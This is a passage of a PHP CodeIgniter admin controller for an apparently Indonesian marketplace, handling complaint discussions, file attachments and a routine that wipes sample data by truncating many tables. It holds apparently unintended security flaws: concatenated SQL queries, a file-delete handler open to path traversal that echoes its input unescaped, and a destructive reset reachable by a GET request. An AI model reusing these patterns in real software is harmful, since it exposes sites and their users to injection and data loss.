        $data['pen'] = $this->db->query("SELECT a.id_penjual, a.ongkir, a.kurir, a.service, b.id_reseller, b.nama_reseller, b.alamat_lengkap, b.kecamatan_id, b.kota_id, b.user_reseller, c.nama_kota FROM `rb_penjualan` a JOIN rb_reseller b ON a.id_penjual=b.id_reseller JOIN rb_kota c ON b.kota_id=c.kota_id where a.id_penjualan='".cetak($id_penjualan)."'")->row_array();
        $data['total'] = $this->db->query("SELECT c.proses, sum((a.harga_jual-a.diskon)*a.jumlah) as total, sum(b.berat*a.jumlah) as total_berat FROM `rb_penjualan_detail` a JOIN rb_produk b ON a.id_produk=b.id_produk 
                            JOIN rb_penjualan c ON a.id_penjualan=c.id_penjualan where a.id_penjualan='".cetak($id_penjualan)."'")->row_array();
        $data['kupon'] = $this->db->query("SELECT sum(c.nilai) as diskon FROM `rb_penjualan_detail` a JOIN rb_penjualan b ON a.id_penjualan=b.id_penjualan 
        JOIN rb_penjualan_kupon c ON a.id_penjualan_detail=c.id_penjualan_detail
            where b.id_penjualan='".cetak($id_penjualan)."'")->row_array();
        $this->template->load('administrator/template','administrator/additional/mod_komplain/diskusi',$data);
    
    }

    function read_query(){
        cek_session_akses('komplain',$this->session->id_session);
		$id = cetak($this->uri->segment(3));
		$jumlah= $this->db->query("SELECT * FROM rb_pusat_bantuan_diskusi where id_pusat_bantuan='$id'")->num_rows();
		$config['base_url'] = base_url().$this->uri->segment(1).'/room/'.$id.'/';
		$config['total_rows'] = $jumlah;
		$config['per_page'] = 10; 	
		if ($this->uri->segment('4') == ''){
			$dari = 0;
		}else{
			$dari = $this->uri->segment('4');
		}
		if (is_numeric($dari)) {
			$data = $this->db->query("SELECT a.*, b.nama_lengkap, b.foto as thumb_foto, c.nama_reseller,  c.foto as foto_reseller 
					FROM rb_pusat_bantuan_diskusi a LEFT JOIN rb_konsumen b ON a.id_konsumen=b.id_konsumen
						LEFT JOIN rb_reseller c ON a.id_konsumen=c.id_konsumen
							where a.id_pusat_bantuan='$id' ORDER BY a.id_diskusi DESC LIMIT $dari, $config[per_page]")->result();
			$this->pagination->initialize($config);
		}
		echo json_encode($data);
    }
    
    public function sendComment(){
        cek_session_akses('komplain',$this->session->id_session);
		// $row = $this->db->query("SELECT a.*, b.nama_lengkap as nama_pelapor, b.no_hp as whatsapp_pelapor, 
		// 									 c.nama_lengkap as nama_terlapor, c.no_hp as whatsapp_terlapor 
		// 										FROM rb_pusat_bantuan a 
		// 										JOIN rb_konsumen b ON a.id_pelapor=b.id_konsumen  
		// 										JOIN rb_konsumen c ON a.id_terlapor=c.id_konsumen
		// 										where a.id_pusat_bantuan='".cetak($this->input->post('id'))."'")->row_array();	

		
		$uploadData['id_pusat_bantuan'] = cetak($this->input->post('id'));
		$uploadData['id_konsumen'] = 0;
		$uploadData['isi_pesan'] = $this->input->post('comment');
		$uploadData['level'] = 'admin';
		$uploadData['waktu_kirim'] = date('Y-m-d H:i:s');
		$uploadData['stat'] = '1';

		$rows = $this->db->query("SELECT GROUP_CONCAT(file_name SEPARATOR ';') as files FROM `img_comment` where id_comment='".$this->session->sesi_messages_diskusi."'")->row_array();
		$uploadData['lampiran'] = $rows['files'];
		if ($this->input->post('comment')!='' OR $rows['files']!=''){
			$data = $this->model_app->pusat_bantuan_diskusi($uploadData);
			$this->session->unset_userdata('sesi_messages_diskusi');
			echo json_encode($data);
		}
    }
    
    public function deleteFile_diskusi(){
		cek_session_akses('komplain',$this->session->id_session);
		$name = $this->input->post('name');
		$filePath = 'asset/files/'.$name;
		if($name){
			if (file_exists($filePath)) 
			{
		        unlink($filePath); // delete file from dir
		    }
			$this->db->delete('img_comment', array('file_name' => $name));
		}

		echo "Deleted File ".$name."<br>";
	}

	public function upload_diskusi(){
		cek_session_akses('komplain',$this->session->id_session);
		$this->load->model('imgComment');
		$data = array();
		if ($this->session->sesi_messages_diskusi==''){
			$id = $this->session->username.'-messages_diskusi-'.date('Ymdhis');
			$this->session->set_userdata(array('sesi_messages_diskusi'=>$id));
		}else{
			$id = $this->session->sesi_messages_diskusi;
		}
        if(isset($_FILES['uploadFile'])){
        	// File upload configuration
            $uploadPath = 'asset/files/';
            $config['upload_path'] = $uploadPath;
			$config['allowed_types'] = 'jpg|jpeg|png|txt|pdf|gif|zip|rar|tar';
			$config['max_size']	= '10000'; // kb

            // Load and initialize upload library
            $this->load->library('upload', $config);
            $this->upload->initialize($config);	

	 	 	$fileName = $_FILES["uploadFile"]["name"];

            // Upload file to server
            if($this->upload->do_upload('uploadFile')){
                $fileData = $this->upload->data();
                $uploadData['file_name'] = $fileData['file_name'];
                $uploadData['uploaded_on'] = date("Y-m-d H:i:s");
                $uploadData['id_comment'] = $id;
            }

	    	if(!empty($uploadData)){
                $insert = $this->imgComment->insert($uploadData);
                $data[] = $uploadData['file_name'];
                echo json_encode($data);
            }
        }else{
        	echo json_encode('param is empty.');
        }
    }
    
    function diskusi_delete(){
        cek_session_akses('komplain',$this->session->id_session);
        $idm = array('id_diskusi' => $this->input->post('id'));
        $result = $this->model_app->delete('rb_pusat_bantuan_diskusi',$idm);
		echo json_encode($result);
    }
    
    function format_data(){
        cek_session_akses('format_data',$this->session->id_session);
        if (isset($_GET['hide'])){
            $this->model_app->update('rb_config', array('value'=>0),array('field'=>'market_sample'));
        }else{
            $this->db->query("TRUNCATE TABLE rb_donasi");
            $this->db->query("TRUNCATE TABLE rb_driver_ongkir");
            $this->db->query("TRUNCATE TABLE rb_kategori_produk");
            $this->db->query("TRUNCATE TABLE rb_kategori_produk_sub");
            $this->db->query("TRUNCATE TABLE rb_konfirmasi_pembayaran");
            $this->db->query("TRUNCATE TABLE rb_konfirmasi_pembayaran_konsumen");
            $this->db->query("TRUNCATE TABLE rb_konsumen");
            $this->db->query("TRUNCATE TABLE rb_konsumen_alamat");
            $this->db->query("TRUNCATE TABLE rb_konsumen_detail");
            $this->db->query("TRUNCATE TABLE rb_konsumen_simpan");
            $this->db->query("TRUNCATE TABLE rb_pembelian");
            $this->db->query("TRUNCATE TABLE rb_pembelian_detail");
            $this->db->query("TRUNCATE TABLE rb_pembelian_pulsa");
            $this->db->query("TRUNCATE TABLE rb_penjualan");
            $this->db->query("TRUNCATE TABLE rb_penjualan_detail");
            $this->db->query("TRUNCATE TABLE rb_penjualan_kupon");
            $this->db->query("TRUNCATE TABLE rb_penjualan_otomatis");
            $this->db->query("TRUNCATE TABLE rb_penjualan_temp");
            $this->db->query("TRUNCATE TABLE rb_ppob_margin");
            $this->db->query("TRUNCATE TABLE rb_produk");
            $this->db->query("TRUNCATE TABLE rb_produk_diskon");
            $this->db->query("TRUNCATE TABLE rb_produk_kupon");
            $this->db->query("TRUNCATE TABLE rb_produk_penawaran");
            $this->db->query("TRUNCATE TABLE rb_produk_ulasan");
            $this->db->query("TRUNCATE TABLE rb_produk_variasi");
            $this->db->query("TRUNCATE TABLE tbl_comment");
            $this->db->query("TRUNCATE TABLE rb_pusat_bantuan");
            $this->db->query("TRUNCATE TABLE rb_pusat_bantuan_diskusi");
            $this->db->query("TRUNCATE TABLE rb_pusat_bantuan_kunjungan");
            $this->db->query("TRUNCATE TABLE rb_rekening");
            $this->db->query("TRUNCATE TABLE rb_rekening_reseller");
            $this->db->query("TRUNCATE TABLE rb_reseller");
            $this->db->query("TRUNCATE TABLE rb_reseller_cod");
            $this->db->query("TRUNCATE TABLE rb_reseller_paket");
            $this->db->query("TRUNCATE TABLE rb_sopir");
            $this->db->query("TRUNCATE TABLE rb_subscribe");
            $this->db->query("TRUNCATE TABLE rb_supplier");
            $this->db->query("TRUNCATE TABLE rb_withdraw");
            $this->db->query("TRUNCATE TABLE slide");
            $this->db->query("TRUNCATE TABLE statistik");
            $this->db->query("TRUNCATE TABLE tagpro");
            $this->db->query("TRUNCATE TABLE tagpro");
            $this->db->query("TRUNCATE TABLE tagpro");
            $this->db->query("TRUNCATE TABLE tagpro");
            $this->model_app->update('rb_config', array('value'=>0),array('field'=>'market_sample'));
            $this->model_app->update('rb_config', array('value'=>'N'),array('field'=>'apps_aktif'));
            echo $this->session->set_flashdata('message', '<div class="alert alert-success alert-dismissible" role="alert"> <b>Sample/Dummy Data</b> - Berhasil dihapus..</div>');
        }
        redirect($this->uri->segment(1).'/home');
    }

	function logout(){
		$this->session->sess_destroy();
		redirect('main');
	}
}
